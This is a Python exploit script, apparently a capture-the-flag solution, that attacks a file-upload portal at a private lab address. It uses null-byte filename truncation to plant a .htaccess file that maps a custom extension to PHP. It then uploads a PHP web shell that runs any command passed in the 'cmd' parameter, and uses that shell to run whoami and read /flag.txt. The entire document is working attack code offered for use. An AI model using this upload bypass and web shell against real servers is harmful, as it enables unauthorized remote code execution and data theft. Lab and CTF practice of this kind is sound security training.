#!/usr/bin/env python3

import argparse
import re
import sys
from typing import Optional
from urllib.parse import quote

import requests


HTACCESS_NAME = b".htaccess\x00.jpg"
HTACCESS_BODY = b"AddType application/x-httpd-php .nata\nAddHandler application/x-httpd-php .nata\n"

SHELL_NAME = b"probe.nata\x00.jpg"
SHELL_BODY = b'<?php echo "OK:"; system($_GET["cmd"] ?? "id"); ?>'


def extract_uploaded_name(html: str) -> Optional[str]:
    match = re.search(r"The file ([^<]+?) has been uploaded\.", html)
    if match:
        return match.group(1)
    return None


def upload_raw(session: requests.Session, base_url: str, raw_name: bytes, content: bytes) -> str:
    response = session.post(
        f"{base_url}/upload.php",
        files={"fileToUpload": (raw_name, content, "image/jpeg")},
        timeout=15,
    )
    response.raise_for_status()

    uploaded_name = extract_uploaded_name(response.text)
    if not uploaded_name:
        snippet = re.sub(r"\s+", " ", response.text)[:400]
        raise RuntimeError(f"upload failed for {raw_name!r}: {snippet}")
    return uploaded_name


def exec_cmd(session: requests.Session, base_url: str, shell_name: str, cmd: str) -> str:
    url = f"{base_url}/submissions/{quote(shell_name)}?cmd={quote(cmd)}"
    response = session.get(url, timeout=20)
    response.raise_for_status()
    return response.text


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Submission Portal and print the flag.")
    parser.add_argument("base_url", nargs="?", default="http://10.42.5.10", help="Target base URL")
    parser.add_argument("--flag-path", default="/flag.txt", help="Path to the flag file")
    parser.add_argument("--shell-name", default="probe.nata", help="Expected shell filename after null-byte truncation")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    session = requests.Session()

    print("[*] Uploading .htaccess")
    uploaded_htaccess = upload_raw(session, base_url, HTACCESS_NAME, HTACCESS_BODY)
    print(f"[+] Stored as: {uploaded_htaccess}")

    print("[*] Uploading webshell")
    uploaded_shell = upload_raw(session, base_url, SHELL_NAME, SHELL_BODY)
    print(f"[+] Stored as: {uploaded_shell}")

    print("[*] Verifying code execution")
    whoami = exec_cmd(session, base_url, args.shell_name, "whoami")
    print(whoami.strip())

    print("[*] Reading flag")
    flag = exec_cmd(session, base_url, args.shell_name, f"cat {args.flag_path}")
    print(flag.strip())

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted", file=sys.stderr)
        raise SystemExit(130)
